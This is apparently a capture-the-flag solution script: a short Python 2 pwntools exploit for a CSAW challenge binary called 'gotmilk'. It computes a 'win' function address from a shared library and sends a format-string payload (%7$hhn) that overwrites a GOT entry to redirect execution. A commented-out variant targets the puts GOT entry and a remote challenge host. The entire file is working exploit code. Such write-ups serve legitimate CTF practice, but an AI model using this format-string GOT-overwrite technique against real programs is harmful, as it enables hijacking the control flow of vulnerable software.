#coding=utf-8
from pwn import *

elf = ELF('./libmylib.so')
lose = 0x0804a010
win = lose + (elf.symbols.win - elf.symbols.lose)
puts = 0x0804a018

p = process('./gotmilk')
#p = remote('pwn.chal.csaw.io', 1004)
#payload = p32(puts - 2) + p32(puts) + '%{}c'.format(((win & 0xffff0000) >> 16) - 8) + '%7$hn' + '%{}c'.format((win & 0xffff) - 0x0804) + '%8$hn'
payload = p32(lose) + '%{}c'.format(0x89 - 4) + '%7$hhn'

p.sendline(payload)
print p.recvall(10)
